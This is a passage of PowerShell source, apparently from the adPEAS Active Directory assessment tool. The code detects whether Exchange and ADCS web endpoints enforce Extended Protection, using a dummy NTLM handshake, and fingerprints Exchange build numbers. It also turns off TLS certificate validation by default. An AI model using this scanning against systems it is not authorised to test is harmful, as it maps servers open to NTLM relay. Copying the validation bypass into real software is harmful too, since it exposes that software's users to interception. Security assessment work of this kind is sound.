        $result.NbDomainName = $type2Result.NbDomainName
        $result.DnsComputerName = $type2Result.DnsComputerName
        $result.DnsDomainName = $type2Result.DnsDomainName
        $result.DnsTreeName = $type2Result.DnsTreeName
        $result.ServerTimestamp = $type2Result.TimestampUtc
        $result.NTLMChallenge = $type2Result.ChallengeHex

        Write-Log "[Test-ExtendedProtection] Type2 parsed - Target: $($type2Result.TargetName), Challenge: $($type2Result.ChallengeHex)"
        if ($type2Result.DnsComputerName) {
            Write-Log "[Test-ExtendedProtection] Server: $($type2Result.DnsComputerName) ($($type2Result.NbComputerName))"
        }
        if ($type2Result.DnsDomainName) {
            Write-Log "[Test-ExtendedProtection] Domain: $($type2Result.DnsDomainName) (Forest: $($type2Result.DnsTreeName))"
        }

        # FIX: Check MsvAvFlags for EPA requirement BEFORE sending Type3
        # This is the most reliable indicator - the server explicitly tells us EPA is required
        if ($type2Result.EPARequired) {
            Write-Log "[Test-ExtendedProtection] MsvAvFlags indicates EPA required (bit 0x02 set) - DEFINITIVE EPA ENABLED"
            $result.Success = $true
            $result.EPAEnabled = $true
            $result.Confidence = "High"
            $result.DiagnosticInfo = "MsvAvFlags in Type2 contains bit 0x02 (MIC/EPA required) - server definitively requires Channel Binding"
            return $result
        }

        # Step 3: Create Type3 message WITHOUT Channel Binding Token
        $type3Message = New-NTLMType3Message -Type2Result $type2Result
        if ($null -eq $type3Message) {
            $result.ErrorMessage = "Failed to create Type3 message"
            return $result
        }
        Write-Log "[Test-ExtendedProtection] Step 3: Sending Type3 (without CBT) to test EPA"

        # Step 4: Send Type3 and analyze response
        try {
            $request2 = [System.Net.HttpWebRequest]::Create($Url)
            $request2.Method = 'GET'
            $request2.Timeout = $TimeoutSeconds * 1000
            $request2.ReadWriteTimeout = $TimeoutSeconds * 1000
            $request2.UserAgent = $UserAgent
            $request2.KeepAlive = $true
            $request2.Headers.Add("Authorization", "NTLM $type3Message")
            $request2.PreAuthenticate = $false
            $request2.UnsafeAuthenticatedConnectionSharing = $true

            $response2 = $request2.GetResponse()
            $result.Type3StatusCode = [int]$response2.StatusCode

            # If we got 200 OK or redirect, EPA is NOT active (our dummy creds "worked" past the channel binding check)
            # Note: The auth itself may succeed or fail based on server config, but EPA would have rejected BEFORE this
            $result.EPAEnabled = $false
            $result.Confidence = "High"
            $result.Type3Response = "Success ($($response2.StatusCode))"
            $result.DiagnosticInfo = "Type3 accepted (HTTP $($result.Type3StatusCode)) - EPA is NOT blocking missing CBT"
            $result.Success = $true

            Write-Log "[Test-ExtendedProtection] Type3 accepted - EPA NOT enabled"

            $response2.Close()
            $response2.Dispose()
        }
        catch [System.Net.WebException] {
            $webEx = $_.Exception
            if ($webEx.Response) {
                $statusCode = [int]$webEx.Response.StatusCode
                $result.Type3StatusCode = $statusCode

                if ($statusCode -eq 401) {
                    # 401 on Type3 - need to analyze WHY
                    $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
                    $result.Type3Response = "401 Unauthorized"

                    # EPA Detection after Type3 (priority order):
                    #
                    # 1. "NTLM <base64blob>" - server sent a new Type2 challenge = NTLM restart.
                    #    EPA rejects the Type3 (SEC_E_INVALID_TOKEN) and restarts negotiation.
                    #    Only NTLM without Negotiate prefix: IIS uses pure NTLM channel for the restart.
                    #    -> EPA ENABLED (High confidence)
                    #
                    # 2. "NTLM" bare (no Negotiate prefix, no blob) - NTLM-only offer = restart signal.
                    #    Same meaning as above but without a blob attached.
                    #    -> EPA ENABLED (High confidence)
                    #
                    # 3. "Negotiate,NTLM" or "Negotiate" (with or without blob) - blanke new Auth-Challenge.
                    #    This is the normal IIS response when authentication FAILS (invalid credentials).
                    #    Both EPA=enabled and EPA=disabled can produce this, BUT:
                    #    - When EPA=disabled: dummy Type3 passes the CBT check, fails on credentials -> 401 Negotiate,NTLM
                    #    - When EPA=enabled:  dummy Type3 fails the CBT check first -> typically NTLM restart (case 1/2)
                    #    If we reach this branch, CBT check passed (EPA not enforced) and only creds failed.
                    #    -> EPA DISABLED (Medium confidence)
                    #
                    # NOTE: The old pattern "NTLM\s*$" incorrectly matched "Negotiate,NTLM" because NTLM
                    # appears at the end of the string. Fixed by requiring NTLM NOT be preceded by "Negotiate,".
                    if ($wwwAuth -match 'NTLM\s+([A-Za-z0-9+/=]{20,})') {
                        # Case 1: Server sent a new NTLM Type2 blob - genuine NTLM restart after EPA rejection
                        $result.EPAEnabled = $true
                        $result.Confidence = "High"
                        $result.DiagnosticInfo = "Server sent new NTLM Type2 challenge after Type3 - EPA rejected the request due to missing Channel Binding Token"
                        Write-Log "[Test-ExtendedProtection] EPA ENABLED - Server restarted NTLM with new Type2 (CBT missing)"
                    }
                    elseif ($wwwAuth -match '(?<![,\s])NTLM\s*$' -or $wwwAuth -match '^NTLM\s*$') {
                        # Case 2: Bare "NTLM" without Negotiate prefix - NTLM-only restart signal
                        # Exclude "Negotiate,NTLM" which ends with NTLM but means normal auth failure
                        $result.EPAEnabled = $true
                        $result.Confidence = "High"
                        $result.DiagnosticInfo = "Server offered bare NTLM after Type3 - NTLM restart indicates EPA rejected missing Channel Binding Token"
                        Write-Log "[Test-ExtendedProtection] EPA ENABLED - Bare NTLM offer after Type3 (CBT missing)"
                    }
                    elseif ($wwwAuth -match 'Negotiate\s+([A-Za-z0-9+/=]{20,})') {
                        # Case 3a: Negotiate blob - Kerberos token or NTLM-via-Negotiate; auth failed on credentials
                        $result.EPAEnabled = $false
                        $result.Confidence = "Medium"
                        $result.DiagnosticInfo = "Server returned 401 with Negotiate blob after Type3 - credentials rejected (CBT check passed, EPA not enforced)"
                        Write-Log "[Test-ExtendedProtection] EPA NOT enabled - auth failure with Negotiate blob (normal credential rejection)"
                    }
                    elseif ($wwwAuth -match 'Negotiate') {
                        # Case 3b: "Negotiate" or "Negotiate,NTLM" - blanke new Auth-Challenge after credential failure
                        # This is the standard IIS response when NTLM auth fails with invalid credentials
                        # and EPA is not blocking (EPA=disabled: CBT check passed, credential check failed)
                        $result.EPAEnabled = $false
                        $result.Confidence = "Medium"
                        $result.DiagnosticInfo = "Server returned 401 with Negotiate,NTLM after Type3 - credentials rejected (CBT check passed, EPA not enforced)"
                        Write-Log "[Test-ExtendedProtection] EPA NOT enabled - auth failure with Negotiate,NTLM (normal credential rejection)"
                    }
                    else {
                        # Generic 401 without recognizable auth header
                        $result.EPAEnabled = $null
                        $result.Confidence = "Low"
                        $result.DiagnosticInfo = "401 received after Type3 but WWW-Authenticate header is unrecognized. Cannot determine EPA status. Header: $wwwAuth"
                        Write-Log "[Test-ExtendedProtection] Inconclusive - 401 with unrecognized WWW-Authenticate: $wwwAuth"
                    }

                    $result.Success = $true
                }
                else {
                    $result.Type3Response = "HTTP $statusCode"
                    $result.ErrorMessage = "Unexpected status code on Type3: $statusCode"
                }

                try { $webEx.Response.Close() } catch {}
            }
            else {
                # Connection error during Type3 - might indicate EPA terminating connection
                $result.ErrorMessage = "Connection failed on Type3: $($webEx.Message)"

                if ($webEx.Message -match 'connection.*closed|reset|aborted' -or $webEx.Status -eq 'ConnectionClosed') {
                    $result.EPAEnabled = $true
                    $result.Confidence = "Medium"
                    $result.DiagnosticInfo = "Connection terminated after Type3 - may indicate EPA rejection"
                    $result.Success = $true
                }
            }
        }
    }
    catch {
        $result.ErrorMessage = "Unexpected error: $($_.Exception.Message)"
        Write-Log "[Test-ExtendedProtection] Error: $($_.Exception.Message)"
    }
    finally {
        # FIX: Proper null check for originalConnectionLimit
        # $originalConnectionLimit could be 0 (though unlikely), so check for $null explicitly
        if ($servicePoint -and $null -ne $originalConnectionLimit) {
            try { $servicePoint.ConnectionLimit = $originalConnectionLimit } catch { }
        }

        # Restore original TLS settings
        try {
            [System.Net.ServicePointManager]::SecurityProtocol = $originalSecurityProtocol
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCertCallback
        } catch { }
    }

    return $result
}



# ----- Invoke-HTTPRequest.ps1 -----

<#
.SYNOPSIS
    Generic HTTP/HTTPS request helper for adPEAS with specialized detection modes.

.DESCRIPTION
    Provides HTTP/HTTPS request functionality for adPEAS with maximum compatibility:
    - Supports all TLS versions (1.0, 1.1, 1.2, 1.3)
    - Ignores SSL certificate errors by default
    - Works with self-signed and expired certificates
    - Specialized modes for version detection (Exchange, ADCS, etc.)

    This is a generic helper that can be extended for various HTTP-based checks.

    IMPORTANT - Thread Safety Note:
    This module uses [System.Net.ServicePointManager] which is a GLOBAL static class.
    Changes to SecurityProtocol and ServerCertificateValidationCallback affect ALL
    HTTP connections in the entire PowerShell process, not just this function.
    The module saves and restores original settings, but parallel calls from multiple
    threads could cause race conditions. For single-threaded use (typical adPEAS usage),
    this is not an issue. For parallel scanning scenarios, consider external synchronization.

.PARAMETER Uri
    The target URI or hostname for the HTTP request.
    If no protocol is specified, https:// is automatically prepended.
    For specialized modes (-ScanExchange, -ScanADCS), the hostname
    is automatically extracted from the URI.

.PARAMETER Method
    HTTP method (GET, HEAD, POST). Default: GET. Only used in standard mode.

.PARAMETER Headers
    Optional hashtable of additional HTTP headers. Only used in standard mode.

.PARAMETER Body
    Optional request body for POST requests. Only used in standard mode.

.PARAMETER ContentType
    Content-Type header for POST requests. Default: application/x-www-form-urlencoded.
    Only used in standard mode.

.PARAMETER TimeoutSeconds
    Request timeout in seconds. Default: 5 (balanced for reliability and speed).
    Valid range: 1-300 seconds.

.PARAMETER UserAgent
    User-Agent header. Default: Mozilla/5.0 (Windows NT 10.0; Win64; x64).

.PARAMETER IgnoreSSLErrors
    Ignore SSL certificate errors. Default: $true.

.PARAMETER ScanExchange
    Special mode: Detect Exchange Server build number from the specified URI/hostname.
    Returns RAW build number only - version interpretation is done by the calling module.
    Detection methods (in order):
    1. /ecp/exporttool endpoint (anonymous XML response)
    2. X-OWA-Version header from /owa/
    3. X-OWA-Version header from /autodiscover/autodiscover.xml (401 response)
    4. X-OWA-Version header via HTTP (non-SSL fallback)

.PARAMETER ScanADCS
    Special mode: Detect ADCS Web Enrollment availability and configuration.
    Tests for /certsrv/ endpoint via HTTP and HTTPS.
    Returns authentication methods from WWW-Authenticate header.

.PARAMETER CAName
    Optional CA common name for ADCS mode. Required for testing CES (Certificate Enrollment Service)
    endpoints. The CES URL pattern is: https://<hostname>/<CAName>_CES_<AuthType>/service.svc
    If not provided, CES endpoint testing will be skipped.
    Only used with -ScanADCS.

.PARAMETER TestEPA
    When used with -ScanExchange or -ScanADCS: Test Extended Protection for Authentication (EPA).
    Performs an NTLM handshake without Channel Binding Token to detect if EPA is enabled.
    EPA protects against NTLM relay attacks over HTTPS.
    Only applicable when HTTPS + NTLM is available.

.EXAMPLE
    Invoke-HTTPRequest -Uri "https://mail.contoso.com/owa/"
    Performs a simple GET request to the specified URL.

.EXAMPLE
    Invoke-HTTPRequest -Uri "mail.contoso.com"
    Performs a GET request (https:// is automatically added).

.EXAMPLE
    Invoke-HTTPRequest -ScanExchange -Uri "mail.contoso.com"
    Returns raw Exchange build number (e.g., "15.2.2562.35").

.EXAMPLE
    Invoke-HTTPRequest -ScanADCS -Uri "ca.contoso.com"
    Tests ADCS Web Enrollment availability via HTTP and HTTPS.

.EXAMPLE
    Invoke-HTTPRequest -ScanADCS -Uri "ca.contoso.com" -TestEPA
    Tests ADCS Web Enrollment and checks if Extended Protection for Authentication is enabled.

.EXAMPLE
    Invoke-HTTPRequest -ScanADCS -Uri "ca.contoso.com" -CAName "Contoso-CA" -TestEPA
    Tests ADCS endpoints including CES (Certificate Enrollment Service) using the CA name.

.EXAMPLE
    Invoke-HTTPRequest -Uri "https://pki.contoso.com/certsrv/" -Method HEAD
    Performs a HEAD request to check ADCS web enrollment.

.OUTPUTS
    [PSCustomObject] with properties depending on mode:
    - Standard mode: Success, StatusCode, Headers, Content, Error
    - ScanExchange: Success, Hostname, BuildNumber, Method, Endpoints, NTLMInfo, Error
    - ScanADCS: Success, Hostname, HttpAvailable, HttpsAvailable, Endpoints, NTLMInfo, Error

    When -TestEPA is used, NTLMInfo contains NTLM Type2 challenge data:
    - NbComputerName: NetBIOS computer name
    - NbDomainName: NetBIOS domain name
    - DnsComputerName: DNS FQDN of the server
    - DnsDomainName: DNS domain name
    - DnsTreeName: DNS forest name
    - ServerTimestamp: Server time (DateTime)
    - NTLMChallenge: NTLM challenge in hex format
    - SourceEndpoint: Which endpoint provided this information

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

function Invoke-HTTPRequest {
    [CmdletBinding(DefaultParameterSetName = 'Standard')]
    param(
        [Parameter(Mandatory = $true, ParameterSetName = 'Standard', Position = 0)]
        [Parameter(Mandatory = $true, ParameterSetName = 'Exchange', Position = 0)]
        [Parameter(Mandatory = $true, ParameterSetName = 'ADCS', Position = 0)]
        [string]$Uri,

        [Parameter(Mandatory = $false, ParameterSetName = 'Standard')]
        [ValidateSet('GET', 'HEAD', 'POST')]
        [string]$Method = 'GET',

        [Parameter(Mandatory = $false, ParameterSetName = 'Standard')]
        [hashtable]$Headers,

        [Parameter(Mandatory = $false, ParameterSetName = 'Standard')]
        [string]$Body,

        [Parameter(Mandatory = $false, ParameterSetName = 'Standard')]
        [string]$ContentType = 'application/x-www-form-urlencoded',

        [Parameter(Mandatory = $false)]
        [ValidateRange(1, 300)]
        [int]$TimeoutSeconds = 3,

        [Parameter(Mandatory = $false)]
        [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',

        [Parameter(Mandatory = $false)]
        [bool]$IgnoreSSLErrors = $true,

        # ===== Specialized Detection Modes =====

        [Parameter(Mandatory = $true, ParameterSetName = 'Exchange')]
        [switch]$ScanExchange,

        [Parameter(Mandatory = $true, ParameterSetName = 'ADCS')]
        [switch]$ScanADCS,

        [Parameter(Mandatory = $false, ParameterSetName = 'ADCS')]
        [string]$CAName,

        [Parameter(Mandatory = $false, ParameterSetName = 'ADCS')]
        [Parameter(Mandatory = $false, ParameterSetName = 'Exchange')]
        [switch]$TestEPA
    )

    process {
        # Save original settings to restore later (local variables for thread safety)
        $originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
        $originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback

        try {
            # Configure TLS settings at the start of process (ensures cleanup in finally)
            Set-TLSConfiguration -IgnoreSSLErrors $IgnoreSSLErrors

            # ===== Exchange Version Detection Mode =====
            if ($PSCmdlet.ParameterSetName -eq 'Exchange') {
                return Invoke-ExchangeScanInternal -Hostname $Uri -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent -TestEPA:$TestEPA
            }

            # ===== ADCS Web Enrollment Detection Mode =====
            if ($PSCmdlet.ParameterSetName -eq 'ADCS') {
                return Invoke-ADCSScanInternal -Hostname $Uri -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent -CAName $CAName -TestEPA:$TestEPA
            }

            # ===== Standard HTTP Request Mode =====
            return Invoke-StandardHTTPRequest -Uri $Uri -Method $Method -Headers $Headers -Body $Body -ContentType $ContentType -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
        }
        finally {
            # Always restore original security settings (even on exception)
            Restore-TLSConfiguration -OriginalProtocol $originalSecurityProtocol -OriginalCallback $originalCertCallback
        }
    }
}

#region ===== TLS CONFIGURATION HELPERS =====

<#
.SYNOPSIS
    Configures TLS settings for maximum compatibility.
#>
function Set-TLSConfiguration {
    [CmdletBinding()]
    param(
        [bool]$IgnoreSSLErrors
    )

    try {
        # Start with TLS 1.2 (most compatible)
        $protocols = [System.Net.SecurityProtocolType]::Tls12

        # Try to add TLS 1.1 (still needed for some legacy servers)
        try {
            $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls11
        }
        catch {
            Write-Log "[Set-TLSConfiguration] TLS 1.1 not available"
        }

        # Try to add TLS 1.0 (legacy, but may be needed)
        try {
            $protocols = $protocols -bor [System.Net.SecurityProtocolType]::Tls
        }
        catch {
            Write-Log "[Set-TLSConfiguration] TLS 1.0 not available"
        }

        # Try to add TLS 1.3 if available (.NET 4.8+)
        try {
            $tls13 = [System.Net.SecurityProtocolType]::Tls13
            $protocols = $protocols -bor $tls13
            Write-Log "[Set-TLSConfiguration] TLS 1.3 enabled"
        }
        catch {
            Write-Log "[Set-TLSConfiguration] TLS 1.3 not available on this system"
        }

        # Note: SSL3 is intentionally NOT added - it's deprecated and disabled in modern .NET

        [System.Net.ServicePointManager]::SecurityProtocol = $protocols
    }
    catch {
        Write-Log "[Set-TLSConfiguration] Error configuring TLS: $_"
    }

    # Ignore SSL certificate errors if requested
    if ($IgnoreSSLErrors) {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        Write-Log "[Set-TLSConfiguration] SSL certificate validation disabled"
    }
}

<#
.SYNOPSIS
    Restores original TLS settings.
#>
function Restore-TLSConfiguration {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [System.Net.SecurityProtocolType]$OriginalProtocol,

        [Parameter(Mandatory = $false)]
        [System.Net.Security.RemoteCertificateValidationCallback]$OriginalCallback
    )

    try {
        [System.Net.ServicePointManager]::SecurityProtocol = $OriginalProtocol
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $OriginalCallback
        Write-Log "[Restore-TLSConfiguration] TLS settings restored"
    }
    catch {
        Write-Log "[Restore-TLSConfiguration] Error restoring TLS settings: $_"
    }
}

#endregion

#region ===== REDIRECT VALIDATION PATTERNS =====

# Exchange-specific redirect path patterns
# These indicate the redirect is to an Exchange endpoint, not a generic load balancer page
$Script:ExchangeRedirectPatterns = @(
    '/owa/',
    '/ecp/',
    '/ews/',
    '/autodiscover/',
    '/mapi/',
    '/rpc/',
    '/powershell/',
    '/Microsoft-Server-ActiveSync/'
)

# ADCS-specific redirect path patterns (matched case-insensitively via .ToLower())
# These indicate the redirect is to an ADCS endpoint, not a generic load balancer page
$Script:ADCSRedirectPatterns = @(
    '/certsrv/',              # Certificate Services web enrollment
    '/adpolicyprovider_cep',  # Certificate Enrollment Policy (CEP)
    '/_ces_',                 # Certificate Enrollment Service (CES) - pattern includes underscore prefix
    '/mscep/'                 # Network Device Enrollment Service (NDES)
)

#endregion

#region ===== STANDARD HTTP REQUEST =====

<#
.SYNOPSIS
    Performs a standard HTTP request with proper resource cleanup.
#>
function Invoke-StandardHTTPRequest {
    [CmdletBinding()]
    param(
        [string]$Uri,
        [string]$Method,
        [hashtable]$Headers,
        [string]$Body,
        [string]$ContentType,
        [int]$TimeoutSeconds,
        [string]$UserAgent
    )

    $result = [PSCustomObject]@{
        Success    = $false
        StatusCode = $null
        Headers    = @{}
        Content    = $null
        Error      = $null
    }

    # Normalize URI - add https:// if no protocol specified
    $targetUri = $Uri
    if ($targetUri -and -not ($targetUri -match '^https?://')) {
        $targetUri = "https://$targetUri"
        Write-Log "[Invoke-HTTPRequest] Added https:// prefix: $targetUri"
    }

    # Validate URI
    if ([string]::IsNullOrWhiteSpace($targetUri)) {
        $result.Error = "Invalid or empty URI"
        return $result
    }

    $request = $null
    $response = $null
    $responseStream = $null
    $reader = $null
    $requestStream = $null

    try {
        Write-Log "[Invoke-HTTPRequest] $Method $targetUri"

        # Create WebRequest for maximum compatibility
        $request = [System.Net.HttpWebRequest]::Create($targetUri)
        $request.Method = $Method
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000  # Also set stream timeout
        $request.UserAgent = $UserAgent
        $request.AllowAutoRedirect = $true
        $request.MaximumAutomaticRedirections = 5

        # Add custom headers
        if ($Headers) {
            foreach ($key in $Headers.Keys) {
                try {
                    $request.Headers.Add($key, $Headers[$key])
                }
                catch {
                    Write-Log "[Invoke-HTTPRequest] Could not add header ${key}: $_"
                }
            }
        }

        # Add body for POST requests
        if ($Method -eq 'POST' -and $Body) {
            $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
            $request.ContentLength = $bodyBytes.Length
            $request.ContentType = $ContentType

            try {
                $requestStream = $request.GetRequestStream()
                $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
            }
            finally {
                if ($requestStream) {
                    try { $requestStream.Close() } catch { }
                    try { $requestStream.Dispose() } catch { }
                }
            }
        }

        # Execute request
        $response = $request.GetResponse()

        $result.StatusCode = [int]$response.StatusCode
        $result.Success = $true

        # Capture headers
        foreach ($header in $response.Headers.AllKeys) {
            $result.Headers[$header] = $response.Headers[$header]
        }

        # Read content (unless HEAD request)
        if ($Method -ne 'HEAD') {
            try {
                $responseStream = $response.GetResponseStream()
                $reader = New-Object System.IO.StreamReader($responseStream)
                $result.Content = $reader.ReadToEnd()
            }
            finally {
                if ($reader) { try { $reader.Dispose() } catch { } }
                if ($responseStream) { try { $responseStream.Dispose() } catch { } }
            }
        }

        Write-Log "[Invoke-HTTPRequest] Success: HTTP $($result.StatusCode)"
    }
    catch [System.Net.WebException] {
        $webEx = $_.Exception
        try {
            if ($webEx.Response) {
                $result.StatusCode = [int]$webEx.Response.StatusCode
                $result.Error = "HTTP $($result.StatusCode): $($webEx.Message)"

                # Still capture headers from error response
                foreach ($header in $webEx.Response.Headers.AllKeys) {
                    $result.Headers[$header] = $webEx.Response.Headers[$header]
                }
            }
            else {
                $result.Error = $webEx.Message
            }
        }
        finally {
            # Dispose WebException response to prevent connection pool exhaustion
            if ($webEx.Response) {
                try { $webEx.Response.Close() } catch { }
                try { $webEx.Response.Dispose() } catch { }
            }
        }
        Write-Log "[Invoke-HTTPRequest] WebException: $($result.Error)"
    }
    catch {
        $result.Error = $_.Exception.Message
        Write-Log "[Invoke-HTTPRequest] Error: $($result.Error)"
    }
    finally {
        # Cleanup all resources
        if ($response) {
            try { $response.Close() } catch { }
            try { $response.Dispose() } catch { }
        }
    }

    return $result
}

#endregion

#region ===== EXCHANGE BUILD NUMBER DETECTION =====

<#
.SYNOPSIS
    Internal function to detect Exchange Server build number and configuration.
.DESCRIPTION
    Uses multiple methods to detect Exchange build number and analyzes endpoint configuration:
    1. Primary: /ecp/exporttool endpoint (anonymous, returns XML with version)
    2. Fallback: X-OWA-Version HTTP header from /owa/
    3. Fallback: X-OWA-Version HTTP header from /autodiscover/autodiscover.xml (401 response)
    4. Fallback: X-OWA-Version via HTTP (non-SSL)

    Additionally detects:
    - Available endpoints (OWA, ECP, EWS, Autodiscover, MAPI, RPC, PowerShell, ActiveSync)
    - Authentication methods (NTLM, Negotiate, Basic, Forms)
    - HTTP vs HTTPS availability
    - Extended Protection for Authentication (EPA) status per endpoint (with -TestEPA)

    Returns RAW build number only. Version interpretation (CU, SE, etc.)
    is done by the calling module (Get-ExchangeInfrastructure).
.PARAMETER Hostname
    Target Exchange server hostname.
.PARAMETER TimeoutSeconds
    Request timeout.
.PARAMETER UserAgent
    User-Agent header.
.PARAMETER TestEPA
    Test Extended Protection for Authentication (EPA) for each endpoint with NTLM over HTTPS.
.RETURNS
    PSCustomObject with Success, Hostname, BuildNumber, Method, AuthMethods, Endpoints (with EPA), and Error properties.
#>
function Invoke-ExchangeScanInternal {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Hostname,

        [Parameter(Mandatory = $false)]
        [int]$TimeoutSeconds = 5,

        [Parameter(Mandatory = $false)]
        [string]$UserAgent,

        [Parameter(Mandatory = $false)]
        [switch]$TestEPA
    )

    # Normalize hostname - extract FQDN only (remove protocol, path, port if present)
    # Input can be: "mail.contoso.com", "https://mail.contoso.com", "https://mail.contoso.com/owa/", "mail.contoso.com:443"
    $targetHost = $Hostname -replace '^https?://', ''  # Remove protocol
    $targetHost = $targetHost -replace '/.*$', ''       # Remove path and everything after first /
    $targetHost = $targetHost -replace ':\d+$', ''      # Remove port number
    $targetHost = $targetHost.Trim()

    $result = [PSCustomObject]@{
        Success          = $false
        Hostname         = $targetHost  # Return normalized hostname (FQDN only)
        BuildNumber      = $null
        Method           = $null
        # Endpoint availability with per-endpoint auth methods and EPA status
        # EPA is tested per endpoint because IIS allows different EPA settings per virtual directory
        # Available = reachable via any transport; AvailableHttp / AvailableHttps record the
        # specific transport(s) so endpoint lines can be rendered per endpoint instead of from
        # the global HttpAvailable / HttpsAvailable flags.
        Endpoints        = [PSCustomObject]@{
            OWA          = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
            ECP          = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
            EWS          = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
            Autodiscover = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
            MAPI         = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
            RPC          = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
            PowerShell   = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
            ActiveSync   = [PSCustomObject]@{ Available = $false; AvailableHttp = $false; AvailableHttps = $false; AuthMethods = ''; EPAEnabled = $null; EPAConfidence = $null }
        }
        # Protocol availability
        HttpAvailable    = $false
        HttpsAvailable   = $false
        ServerHeader     = $null
        # Legacy EPA properties (for backward compatibility) - reflects first endpoint with NTLM
        EPAEnabled       = $null         # $true = EPA active (secure), $false = EPA not active (vulnerable), $null = not tested
        EPAConfidence    = $null         # "High", "Medium", "Low", "Unknown"
        EPADiagnostic    = $null         # Diagnostic info for EPA test
        # NTLM information from Type2 challenge (populated when -TestEPA is used)
        NTLMInfo         = $null         # PSCustomObject with NTLM details from first successful EPA test
        Error            = $null
    }

    # Validate hostname
    if ([string]::IsNullOrWhiteSpace($targetHost)) {
        $result.Error = "Invalid or empty hostname"
        return $result
    }

    Write-Log "[ScanExchange] Detecting Exchange configuration for: $targetHost"

    # ===== Method 1: /ecp/exporttool (Primary - Anonymous access for version) =====
    $exportToolUrl = "https://$targetHost/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application"

    Write-Log "[ScanExchange] Method 1: Trying $exportToolUrl"

    $response = $null
    $responseStream = $null
    $reader = $null

    try {
        $request = [System.Net.HttpWebRequest]::Create($exportToolUrl)
        $request.Method = 'GET'
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = $UserAgent
        $request.AllowAutoRedirect = $true

        $response = $request.GetResponse()

        if ($response.StatusCode -eq 'OK') {
            $result.HttpsAvailable = $true
            # Note: Don't set ECP.Available here yet - we need to verify the response is actual Exchange XML

            # Capture server header
            if ($response.Headers['Server']) {
                $result.ServerHeader = $response.Headers['Server']
            }

            try {
                $responseStream = $response.GetResponseStream()
                $reader = New-Object System.IO.StreamReader($responseStream)
                $content = $reader.ReadToEnd()

                # Parse XML response
                try {
                    # Remove BOM if present (Unicode BOM is U+FEFF)
                    $cleanContent = $content.Trim()
                    if ($cleanContent.Length -gt 0 -and $cleanContent[0] -eq [char]0xFEFF) {
                        $cleanContent = $cleanContent.Substring(1)
                    }

                    # Check if response is HTML instead of XML (common with reverse proxies/load balancers)
                    if ($cleanContent -match '^\s*<(!DOCTYPE\s+html|html)') {
                        Write-Log "[ScanExchange] Method 1: Response is HTML (proxy/load balancer page), not Exchange XML"
                        # Do NOT set ECP.Available - this is not an Exchange response
                    }
                    else {
                        # Try direct XML parse
                        $xml = [xml]$cleanContent

                        # Extract version from assemblyIdentity
                        $buildNumber = $xml.assembly.assemblyIdentity.version

                        if ($buildNumber) {
                            $result.Success = $true
                            $result.BuildNumber = $buildNumber
                            $result.Method = "/ecp/exporttool"
                            # Only mark ECP as available when we successfully got Exchange version from exporttool
                            $result.Endpoints.ECP.Available = $true

                            Write-Log "[ScanExchange] Method 1 SUCCESS: $buildNumber"
                            # Don't return yet - continue to collect endpoint info
                        }
                    }
                }
                catch {
                    # Provide concise error message without dumping entire content
                    $errorMsg = $_.Exception.Message
                    # Truncate if error message contains the content (common with XML parse errors)
                    if ($errorMsg.Length -gt 200) {
                        $errorMsg = $errorMsg.Substring(0, 150) + "... (truncated)"
                    }
                    Write-Log "[ScanExchange] Method 1: XML parse failed - $errorMsg"
                }
            }
            finally {
                if ($reader) { try { $reader.Dispose() } catch { } }
                if ($responseStream) { try { $responseStream.Dispose() } catch { } }
            }
        }
    }
    catch [System.Net.WebException] {
        $statusCode = if ($_.Exception.Response) { [int]$_.Exception.Response.StatusCode } else { "N/A" }
        Write-Log "[ScanExchange] Method 1 failed (HTTP $statusCode): $($_.Exception.Message)"
        # Dispose WebException response
        if ($_.Exception.Response) {
            try { $_.Exception.Response.Close() } catch { }
        }
    }
    catch {
        Write-Log "[ScanExchange] Method 1 failed: $_"
    }
    finally {
        if ($response) {
            try { $response.Close() } catch { }
            try { $response.Dispose() } catch { }
        }
    }

    # ===== Test OWA endpoint (also used for version detection) =====
    $owaUrl = "https://$targetHost/owa/"
    Write-Log "[ScanExchange] Testing OWA endpoint: $owaUrl"

    $owaResult = Test-ExchangeEndpoint -Url $owaUrl -EndpointName "OWA" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($owaResult.IsExchangeEndpoint) {
        $result.HttpsAvailable = $true
        $result.Endpoints.OWA.Available = $true
        $result.Endpoints.OWA.AuthMethods = $owaResult.AuthMethods -join ', '

